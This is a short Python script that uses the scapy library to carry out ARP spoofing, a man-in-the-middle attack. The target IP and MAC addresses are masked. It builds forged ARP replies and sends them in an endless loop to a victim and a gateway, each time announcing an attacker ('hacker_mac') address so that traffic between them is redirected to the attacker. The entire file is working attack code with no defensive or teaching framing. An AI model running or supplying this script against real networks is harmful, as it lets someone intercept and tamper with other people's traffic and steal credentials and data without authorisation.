import scapy.all as scapy
import time 


def create_arp_spoof(victim_ip, gateway_ip, victim_mac, gateway_mac):
    
    arp_response = scapy.ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip, hwsrc=gateway_mac)
    scapy.send(arp_response, verbose=False)

def rapid_send_arp_spoof(victim_ip, gateway_ip, victim_mac, hacker_mac, gateway_mac):

    while True:
        create_arp_spoof(victim_ip, gateway_ip, victim_mac, hacker_mac)
        create_arp_spoof(gateway_ip, victim_ip, gateway_mac, hacker_mac)

        print(f"The packets have been sent to {victim_ip} and {gateway_ip}")

        time.sleep(2)


def main():
    victim_ip = "***:***:*:**"
    gateway_ip = "***:***:*:*"
    victim_mac = "**:**:**:**:**:**"
    gateway_mac = "**:**:**:**:**:**"
    hacker_mac = "**:**:**:**:**:**"

    create_arp_spoof(victim_ip, gateway_ip, victim_mac, gateway_mac)
    rapid_send_arp_spoof(victim_ip, gateway_ip, victim_mac, hacker_mac, gateway_mac)


if __name__ == "__main__":
    main()